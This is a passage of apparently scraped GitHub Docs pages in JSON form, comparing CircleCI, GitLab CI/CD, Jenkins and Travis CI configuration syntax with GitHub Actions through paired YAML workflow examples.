        "content": "---\nversion: 2.1\n\njobs:\n\n  ruby-26:\n    docker:\n      - image: circleci/ruby:2.6.3-node-browsers-legacy\n        environment:\n          PGHOST: localhost\n          PGUSER: administrate\n          RAILS_ENV: test\n      - image: postgres:10.1-alpine\n        environment:\n          POSTGRES_USER: administrate\n          POSTGRES_DB: ruby26\n          POSTGRES_PASSWORD: \"\"\n\n    working_directory: ~/administrate\n\n    steps:\n      - checkout\n\n      # Bundle install dependencies\n      - run: bundle install --path vendor/bundle\n\n      # Wait for DB\n      - run: dockerize -wait tcp://localhost:5432 -timeout 1m\n\n      # Setup the environment\n      - run: cp .sample.env .env\n\n      # Setup the database\n      - run: bundle exec rake db:setup\n\n      # Run the tests\n      - run: bundle exec rake\n\nworkflows:\n  version: 2\n  build:\n    jobs:\n      - ruby-26\n...\n\n- attach_workspace:\n    at: /tmp/workspace"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitHub Actions syntax for using databases and service containers"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Containers\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n    container: circleci/ruby:2.6.3-node-browsers-legacy\n\n    env:\n      PGHOST: postgres\n      PGUSER: administrate\n      RAILS_ENV: test\n\n    services:\n      postgres:\n        image: postgres:10.1-alpine\n        env:\n          POSTGRES_USER: administrate\n          POSTGRES_DB: ruby25\n          POSTGRES_PASSWORD: \"\"\n        ports:\n          - 5432:5432\n        # Add a health check\n        options: --health-cmd pg_isready --health-interval 10s --health-timeout 5s --health-retries 5\n\n    steps:\n      # This Docker file changes sets USER to circleci instead of using the default user, so we need to update file permissions for this image to work on GH Actions.\n      # See https://docs.github.com/actions/using-github-hosted-runners/about-github-hosted-runners#docker-container-filesystem\n\n      - name: Setup file system permissions\n        run: sudo chmod -R 777 $GITHUB_WORKSPACE /github /__w/_temp\n      - uses: actions/checkout@v4\n      - name: Install dependencies\n        run: bundle install --path vendor/bundle\n      - name: Setup environment configuration\n        run: cp .sample.env .env\n      - name: Setup database\n        run: bundle exec rake db:setup\n      - name: Run tests\n        run: bundle exec rake"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeAbout service containers."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Complete Example"
      },
      {
        "type": "paragraph",
        "text": "Below is a real-world example. The left shows the actual CircleCIconfig.ymlfor thethoughtbot/administratorrepository. The right shows the GitHub Actions equivalent."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Complete example for CircleCI"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "---\nversion: 2.1\n\ncommands:\n  shared_steps:\n    steps:\n      - checkout\n\n      # Restore Cached Dependencies\n      - restore_cache:\n          name: Restore bundle cache\n          key: administrate-{{ checksum \"Gemfile.lock\" }}\n\n      # Bundle install dependencies\n      - run: bundle install --path vendor/bundle\n\n      # Cache Dependencies\n      - save_cache:\n          name: Store bundle cache\n          key: administrate-{{ checksum \"Gemfile.lock\" }}\n          paths:\n            - vendor/bundle\n\n      # Wait for DB\n      - run: dockerize -wait tcp://localhost:5432 -timeout 1m\n\n      # Setup the environment\n      - run: cp .sample.env .env\n\n      # Setup the database\n      - run: bundle exec rake db:setup\n\n      # Run the tests\n      - run: bundle exec rake\n\ndefault_job: &default_job\n  working_directory: ~/administrate\n  steps:\n    - shared_steps\n    # Run the tests against multiple versions of Rails\n    - run: bundle exec appraisal install\n    - run: bundle exec appraisal rake\n\njobs:\n  ruby-25:\n    <<: *default_job\n    docker:\n      - image: circleci/ruby:2.5.0-node-browsers\n        environment:\n          PGHOST: localhost\n          PGUSER: administrate\n          RAILS_ENV: test\n      - image: postgres:10.1-alpine\n        environment:\n          POSTGRES_USER: administrate\n          POSTGRES_DB: ruby25\n          POSTGRES_PASSWORD: \"\"\n\n  ruby-26:\n    <<: *default_job\n    docker:\n      - image: circleci/ruby:2.6.3-node-browsers-legacy\n        environment:\n          PGHOST: localhost\n          PGUSER: administrate\n          RAILS_ENV: test\n      - image: postgres:10.1-alpine\n        environment:\n          POSTGRES_USER: administrate\n          POSTGRES_DB: ruby26\n          POSTGRES_PASSWORD: \"\"\n\nworkflows:\n  version: 2\n  multiple-rubies:\n    jobs:\n      - ruby-26\n      - ruby-25"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Complete example for GitHub Actions"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Containers\n\non: [push]\n\njobs:\n  build:\n\n    strategy:\n      matrix:\n        ruby: ['2.5', '2.6.3']\n\n    runs-on: ubuntu-latest\n\n    env:\n      PGHOST: localhost\n      PGUSER: administrate\n      RAILS_ENV: test\n\n    services:\n      postgres:\n        image: postgres:10.1-alpine\n        env:\n          POSTGRES_USER: administrate\n          POSTGRES_DB: ruby25\n          POSTGRES_PASSWORD: \"\"\n        ports:\n          - 5432:5432\n        # Add a health check\n        options: --health-cmd pg_isready --health-interval 10s --health-timeout 5s --health-retries 5\n\n    steps:\n      - uses: actions/checkout@v4\n      - name: Setup Ruby\n        uses: eregon/use-ruby-action@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n        with:\n          ruby-version: ${{ matrix.ruby }}\n      - name: Cache dependencies\n        uses: actions/cache@v4\n        with:\n          path: vendor/bundle\n          key: administrate-${{ matrix.image }}-${{ hashFiles('Gemfile.lock') }}\n      - name: Install postgres headers\n        run: |\n          sudo apt-get update\n          sudo apt-get install libpq-dev\n      - name: Install dependencies\n        run: bundle install --path vendor/bundle\n      - name: Setup environment configuration\n        run: cp .sample.env .env\n      - name: Setup database\n        run: bundle exec rake db:setup\n      - name: Run tests\n        run: bundle exec rake\n      - name: Install appraisal\n        run: bundle exec appraisal install\n      - name: Run appraisal\n        run: bundle exec appraisal rake"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-gitlab-cicd-to-github-actions",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "GitLab CI/CD and GitHub Actions both allow you to create workflows that automatically build, test, publish, release, and deploy code. GitLab CI/CD and GitHub Actions share some similarities in workflow configuration:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Workflow configuration files are written in YAML and are stored in the code's repository.",
          "Workflows include one or more jobs.",
          "Jobs include one or more steps or individual commands.",
          "Jobs can run on either managed or self-hosted machines."
        ]
      },
      {
        "type": "paragraph",
        "text": "There are a few differences, and this guide will show you the important differences so that you can migrate your workflow to GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Jobs"
      },
      {
        "type": "paragraph",
        "text": "Jobs in GitLab CI/CD are very similar to jobs in GitHub Actions. In both systems, jobs have the following characteristics:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Jobs contain a series of steps or scripts that run sequentially.",
          "Jobs can run on separate machines or in separate containers.",
          "Jobs run in parallel by default, but can be configured to run sequentially."
        ]
      },
      {
        "type": "paragraph",
        "text": "You can run a script or a shell command in a job. In GitLab CI/CD, script steps are specified using thescriptkey. In GitHub Actions, all scripts are specified using therunkey."
      },
      {
        "type": "paragraph",
        "text": "Below is an example of the syntax for each system."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitLab CI/CD syntax for jobs"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "job1:\n  variables:\n    GIT_CHECKOUT: \"true\"\n  script:\n    - echo \"Run your script here\""
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitHub Actions syntax for jobs"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  job1:\n    steps:\n      - uses: actions/checkout@v4\n      - run: echo \"Run your script here\""
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Runners"
      },
      {
        "type": "paragraph",
        "text": "Runners are machines on which the jobs run. Both GitLab CI/CD and GitHub Actions offer managed and self-hosted variants of runners. In GitLab CI/CD,tagsare used to run jobs on different platforms, while in GitHub Actions it is done with theruns-onkey."
      },
      {
        "type": "paragraph",
        "text": "Below is an example of the syntax for each system."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitLab CI/CD syntax for runners"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "windows_job:\n  tags:\n    - windows\n  script:\n    - echo Hello, %USERNAME%!\n\nlinux_job:\n  tags:\n    - linux\n  script:\n    - echo \"Hello, $USER!\""
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitHub Actions syntax for runners"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "windows_job:\n  runs-on: windows-latest\n  steps:\n    - run: echo Hello, %USERNAME%!\n\nlinux_job:\n  runs-on: ubuntu-latest\n  steps:\n    - run: echo \"Hello, $USER!\""
      },
      {
        "type": "paragraph",
        "text": "For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Docker images"
      },
      {
        "type": "paragraph",
        "text": "Both GitLab CI/CD and GitHub Actions support running jobs in a Docker image. In GitLab CI/CD, Docker images are defined with animagekey, while in GitHub Actions it is done with thecontainerkey."
      },
      {
        "type": "paragraph",
        "text": "Below is an example of the syntax for each system."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitLab CI/CD syntax for Docker images"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "my_job:\n  image: node:20-bookworm-slim"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitHub Actions syntax for Docker images"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  my_job:\n    container: node:20-bookworm-slim"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Condition and expression syntax"
      },
      {
        "type": "paragraph",
        "text": "GitLab CI/CD usesrulesto determine if a job will run for a specific condition. GitHub Actions uses theifkeyword to prevent a job from running unless a condition is met."
      },
      {
        "type": "paragraph",
        "text": "Below is an example of the syntax for each system."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitLab CI/CD syntax for conditions and expressions"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "deploy_prod:\n  stage: deploy\n  script:\n    - echo \"Deploy to production server\"\n  rules:\n    - if: '$CI_COMMIT_BRANCH == \"master\"'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitHub Actions syntax for conditions and expressions"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  deploy_prod:\n    if: contains( github.ref, 'master')\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"Deploy to production server\""
      },
      {
        "type": "paragraph",
        "text": "For more information, seeEvaluate expressions in workflows and actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Dependencies between Jobs"
      },
      {
        "type": "paragraph",
        "text": "Both GitLab CI/CD and GitHub Actions allow you to set dependencies for a job. In both systems, jobs run in parallel by default, but job dependencies in GitHub Actions can be specified explicitly with theneedskey. GitLab CI/CD also has a concept ofstages, where jobs in a stage run concurrently, but the next stage will start when all the jobs in the previous stage have completed. You can recreate this scenario in GitHub Actions with theneedskey."
      },
      {
        "type": "paragraph",
        "text": "Below is an example of the syntax for each system. The workflows start with two jobs namedbuild_aandbuild_brunning in parallel, and when those jobs complete, another job calledtest_abwill run. Finally, whentest_abcompletes, thedeploy_abjob will run."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitLab CI/CD syntax for dependencies between jobs"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "stages:\n  - build\n  - test\n  - deploy\n\nbuild_a:\n  stage: build\n  script:\n    - echo \"This job will run first.\"\n\nbuild_b:\n  stage: build\n  script:\n    - echo \"This job will run first, in parallel with build_a.\"\n\ntest_ab:\n  stage: test\n  script:\n    - echo \"This job will run after build_a and build_b have finished.\"\n\ndeploy_ab:\n  stage: deploy\n  script:\n    - echo \"This job will run after test_ab is complete\""
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitHub Actions syntax for dependencies between jobs"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  build_a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"This job will be run first.\"\n\n  build_b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"This job will be run first, in parallel with build_a\"\n\n  test_ab:\n    runs-on: ubuntu-latest\n    needs: [build_a,build_b]\n    steps:\n      - run: echo \"This job will run after build_a and build_b have finished\"\n\n  deploy_ab:\n    runs-on: ubuntu-latest\n    needs: [test_ab]\n    steps:\n      - run: echo \"This job will run after test_ab is complete\""
      },
      {
        "type": "paragraph",
        "text": "For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Scheduling workflows"
      },
      {
        "type": "paragraph",
        "text": "Both GitLab CI/CD and GitHub Actions allow you to run workflows at a specific interval. In GitLab CI/CD, pipeline schedules are configured with the UI, while in GitHub Actions you can trigger a workflow on a scheduled interval with the \"on\" key."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeEvents that trigger workflows."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Variables and secrets"
      },
      {
        "type": "paragraph",
        "text": "GitLab CI/CD and GitHub Actions support setting variables in the pipeline or workflow configuration file, and creating secrets using the GitLab or GitHub UI."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeStore information in variablesandAbout secrets."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Caching"
      },
      {
        "type": "paragraph",
        "text": "GitLab CI/CD and GitHub Actions provide a method in the configuration file to manually cache workflow files."
      },
      {
        "type": "paragraph",
        "text": "Below is an example of the syntax for each system."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitLab CI/CD syntax for caching"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "image: node:latest\n\ncache:\n  key: $CI_COMMIT_REF_SLUG\n  paths:\n    - .npm/\n\nbefore_script:\n  - npm ci --cache .npm --prefer-offline\n\ntest_async:\n  script:\n    - node ./specs/start.js ./specs/async.spec.js"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitHub Actions syntax for caching"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  test_async:\n    runs-on: ubuntu-latest\n    steps:\n    - name: Cache node modules\n      uses: actions/cache@v4\n      with:\n        path: ~/.npm\n        key: v1-npm-deps-${{ hashFiles('**/package-lock.json') }}\n        restore-keys: v1-npm-deps-"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Artifacts"
      },
      {
        "type": "paragraph",
        "text": "Both GitLab CI/CD and GitHub Actions can upload files and directories created by a job as artifacts. In GitHub Actions, artifacts can be used to persist data across multiple jobs."
      },
      {
        "type": "paragraph",
        "text": "Below is an example of the syntax for each system."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitLab CI/CD syntax for artifacts"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "script:\nartifacts:\n  paths:\n    - math-homework.txt"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitHub Actions syntax for artifacts"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Upload math result for job 1\n  uses: actions/upload-artifact@v4\n  with:\n    name: homework\n    path: math-homework.txt"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeStoring and sharing data from a workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Databases and service containers"
      },
      {
        "type": "paragraph",
        "text": "Both systems enable you to include additional containers for databases, caching, or other dependencies."
      },
      {
        "type": "paragraph",
        "text": "In GitLab CI/CD, a container for the job is specified with theimagekey, while GitHub Actions uses thecontainerkey. In both systems, additional service containers are specified with theserviceskey."
      },
      {
        "type": "paragraph",
        "text": "Below is an example of the syntax for each system."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitLab CI/CD syntax for databases and service containers"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "container-job:\n  variables:\n    POSTGRES_PASSWORD: postgres\n    # The hostname used to communicate with the\n    # PostgreSQL service container\n    POSTGRES_HOST: postgres\n    # The default PostgreSQL port\n    POSTGRES_PORT: 5432\n  image: node:20-bookworm-slim\n  services:\n    - postgres\n  script:\n    # Performs a clean installation of all dependencies\n    # in the `package.json` file\n    - npm ci\n    # Runs a script that creates a PostgreSQL client,\n    # populates the client with data, and retrieves data\n    - node client.js\n  tags:\n    - docker"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitHub Actions syntax for databases and service containers"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  container-job:\n    runs-on: ubuntu-latest\n    container: node:20-bookworm-slim\n\n    services:\n      postgres:\n        image: postgres\n        env:\n          POSTGRES_PASSWORD: postgres\n\n    steps:\n      - name: Check out repository code\n        uses: actions/checkout@v4\n\n      # Performs a clean installation of all dependencies\n      # in the `package.json` file\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Connect to PostgreSQL\n        # Runs a script that creates a PostgreSQL client,\n        # populates the client with data, and retrieves data\n        run: node client.js\n        env:\n          # The hostname used to communicate with the\n          # PostgreSQL service container\n          POSTGRES_HOST: postgres\n          # The default PostgreSQL port\n          POSTGRES_PORT: 5432"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeAbout service containers."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-jenkins-to-github-actions",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "Jenkins and GitHub Actions both allow you to create workflows that automatically build, test, publish, release, and deploy code. Jenkins and GitHub Actions share some similarities in workflow configuration:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Jenkins creates workflows usingDeclarative Pipelines, which are similar to GitHub Actions workflow files.",
          "Jenkins usesstagesto run a collection of steps, while GitHub Actions uses jobs to group one or more steps or individual commands.",
          "Jenkins and GitHub Actions support container-based builds. For more information, seeCreating a Docker container action.",
          "Steps or tasks can be reused and shared with the community."
        ]
      },
      {
        "type": "paragraph",
        "text": "For more information, seeUnderstanding GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Key differences"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Jenkins has two types of syntax for creating pipelines: Declarative Pipeline and Scripted Pipeline. GitHub Actions uses YAML to create workflows and configuration files. For more information, seeWorkflow syntax for GitHub Actions.",
          "Jenkins deployments are typically self-hosted, with users maintaining the servers in their own data centers. GitHub Actions offers a hybrid cloud approach by hosting its own runners that you can use to run jobs, while also supporting self-hosted runners. For more information, seeAbout self-hosted runners."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Comparing capabilities"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Distributing your builds"
      },
      {
        "type": "paragraph",
        "text": "Jenkins lets you send builds to a single build agent, or you can distribute them across multiple agents. You can also classify these agents according to various attributes, such as operating system types."
      },
      {
        "type": "paragraph",
        "text": "Similarly, GitHub Actions can send jobs to GitHub-hosted or self-hosted runners, and you can use labels to classify runners according to various attributes. For more information, seeUnderstanding GitHub ActionsandAbout self-hosted runners."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using sections to organize pipelines"
      },
      {
        "type": "paragraph",
        "text": "Jenkins splits its Declarative Pipelines into multiple sections. Similarly, GitHub Actions organizes its workflows into separate sections. The table below compares Jenkins sections with the GitHub Actions workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using directives"
      },
      {
        "type": "paragraph",
        "text": "Jenkins uses directives to manageDeclarative Pipelines. These directives define the characteristics of your workflow and how it will execute. The table below demonstrates how these directives map to concepts within GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using sequential stages"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Parallel job processing"
      },
      {
        "type": "paragraph",
        "text": "Jenkins can run thestagesandstepsin parallel, while GitHub Actions currently only runs jobs in parallel."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Matrix"
      },
      {
        "type": "paragraph",
        "text": "Both GitHub Actions and Jenkins let you use a matrix to define various system combinations."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using steps to execute tasks"
      },
      {
        "type": "paragraph",
        "text": "Jenkins groupsstepstogether instages. Each of these steps can be a script, function, or command, among others. Similarly, GitHub Actions usesjobsto execute specific groups ofsteps."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Examples of common tasks"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Scheduling a pipeline to run withcron"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Jenkins pipeline withcron"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "pipeline {\n  agent any\n  triggers {\n    cron('H/15 * * * 1-5')\n  }\n}"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "GitHub Actions workflow withcron"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  schedule:\n    - cron: '*/15 * * * 1-5'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Configuring environment variables in a pipeline"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Jenkins pipeline with an environment variable"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "pipeline {\n  agent any\n  environment {\n    MAVEN_PATH = '/usr/local/maven'\n  }\n}"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "GitHub Actions workflow with an environment variable"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  maven-build:\n    env:\n      MAVEN_PATH: '/usr/local/maven'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Building from upstream projects"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Jenkins pipeline that builds from an upstream project"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "pipeline {\n  triggers {\n    upstream(\n      upstreamProjects: 'job1,job2',\n      threshold: hudson.model.Result.SUCCESS\n    )\n  }\n}"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "GitHub Actions workflow that builds from an upstream project"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  job1:\n  job2:\n    needs: job1\n  job3:\n    needs: [job1, job2]"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Building with multiple operating systems"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Jenkins pipeline that builds with multiple operating systems"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "pipeline {\n  agent none\n  stages {\n    stage('Run Tests') {\n      matrix {\n        axes {\n          axis {\n            name: 'PLATFORM'\n            values: 'macos', 'linux'\n          }\n        }\n        agent { label \"${PLATFORM}\" }\n        stages {\n          stage('test') {\n            tools { nodejs \"node-20\" }\n            steps {\n              dir(\"scripts/myapp\") {\n                sh(script: \"npm install -g bats\")\n                sh(script: \"bats tests\")\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "GitHub Actions workflow that builds with multiple operating systems"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: demo-workflow\non:\n  push:\njobs:\n  test:\n    runs-on: ${{ matrix.os }}\n    strategy:\n      fail-fast: false\n      matrix:\n        os: [macos-latest, ubuntu-latest]\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 20\n      - run: npm install -g bats\n      - run: bats tests\n        working-directory: ./scripts/myapp"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-travis-ci-to-github-actions",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide helps you migrate from Travis CI to GitHub Actions. It compares their concepts and syntax, describes the similarities, and demonstrates their different approaches to common tasks."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Before you start"
      },
      {
        "type": "paragraph",
        "text": "Before starting your migration to GitHub Actions, it would be useful to become familiar with how it works:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "For a quick example that demonstrates a GitHub Actions job, seeQuickstart for GitHub Actions.",
          "To learn the essential GitHub Actions concepts, seeUnderstanding GitHub Actions."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Comparing job execution"
      },
      {
        "type": "paragraph",
        "text": "To give you control over when CI tasks are executed, a GitHub Actionsworkflowusesjobsthat run in parallel by default. Each job containsstepsthat are executed in a sequence that you define. If you need to run setup and cleanup actions for a job, you can define steps in each job to perform these."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Key similarities"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions and Travis CI share certain similarities, and understanding these ahead of time can help smooth the migration process."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using YAML syntax"
      },
      {
        "type": "paragraph",
        "text": "Travis CI and GitHub Actions both use YAML to create jobs and workflows, and these files are stored in the code's repository. For more information on how GitHub Actions uses YAML, seeUnderstanding GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Custom variables"
      },
      {
        "type": "paragraph",
        "text": "Travis CI lets you set variables and share them between stages. Similarly, GitHub Actions lets you define variables for a workflow. For more information, seeStore information in variables."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Default variables"
      },
      {
        "type": "paragraph",
        "text": "Travis CI and GitHub Actions both include default environment variables that you can use in your YAML files. For GitHub Actions, you can see these listed inStore information in variables."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Parallel job processing"
      },
      {
        "type": "paragraph",
        "text": "Travis CI can usestagesto run jobs in parallel. Similarly, GitHub Actions runsjobsin parallel. For more information, seeAbout workflows."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Status badges"
      },
      {
        "type": "paragraph",
        "text": "Travis CI and GitHub Actions both support status badges, which let you indicate whether a build is passing or failing.\nFor more information, seeAdding a workflow status badge."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using a matrix"
      },
      {
        "type": "paragraph",
        "text": "Travis CI and GitHub Actions both support a matrix, allowing you to perform testing using combinations of operating systems and software packages. For more information, seeRunning variations of jobs in a workflow."
      },
      {
        "type": "paragraph",
        "text": "Below is an example comparing the syntax for each system."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Travis CI syntax for a matrix"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "matrix:\n  include:\n    - rvm: '2.5'\n    - rvm: '2.6.3'"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "GitHub Actions syntax for a matrix"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  build:\n    strategy:\n      matrix:\n        ruby: ['2.5', '2.6.3']"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Targeting specific branches"
      },
      {
        "type": "paragraph",
        "text": "Travis CI and GitHub Actions both allow you to target your CI to a specific branch. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Below is an example of the syntax for each system."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Travis CI syntax for targeting specific branches"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "branches:\n  only:\n    - main\n    - 'mona/octocat'"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "GitHub Actions syntax for targeting specific branches"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    branches:\n      - main\n      - 'mona/octocat'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Checking out submodules"
      },
      {
        "type": "paragraph",
        "text": "Travis CI and GitHub Actions both allow you to control whether submodules are included in the repository clone."
      },
      {
        "type": "paragraph",
        "text": "Below is an example of the syntax for each system."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Travis CI syntax for checking out submodules"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "git:\n  submodules: false"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "GitHub Actions syntax for checking out submodules"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- uses: actions/checkout@v4\n  with:\n    submodules: false"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using environment variables in a matrix"
      },
      {
        "type": "paragraph",
        "text": "Travis CI and GitHub Actions can both add custom variables to a test matrix, which allows you to refer to the variable in a later step."
      },
      {
        "type": "paragraph",
        "text": "In GitHub Actions, you can use theincludekey to add custom environment variables to a matrix. In this example, the matrix entries fornode-versionare each configured to use different values for thesiteanddatacenterenvironment variables. TheEcho site detailsstep then usesenv: ${{ matrix.env }}to refer to the custom variables:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Node.js CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n       include:\n         - node-version: '14.x'\n           site: \"prod\"\n           datacenter: \"site-a\"\n         - node-version: '16.x'\n           site: \"dev\"\n           datacenter: \"site-b\"\n    steps:\n      - name: Echo site details\n        env:\n          SITE: ${{ matrix.site }}\n          DATACENTER: ${{ matrix.datacenter }}\n        run: echo $SITE $DATACENTER"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Key features in GitHub Actions"
      },
      {
        "type": "paragraph",
        "text": "When migrating from Travis CI, consider the following key features in GitHub Actions:"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Storing secrets"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions allows you to store secrets and reference them in your jobs. GitHub Actions organizations can limit which repositories can access organization secrets. Deployment protection rules can require manual approval for a workflow to access environment secrets. For more information, seeAbout secrets."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Sharing files between jobs and workflows"
      },
      {
        "type": "paragraph",
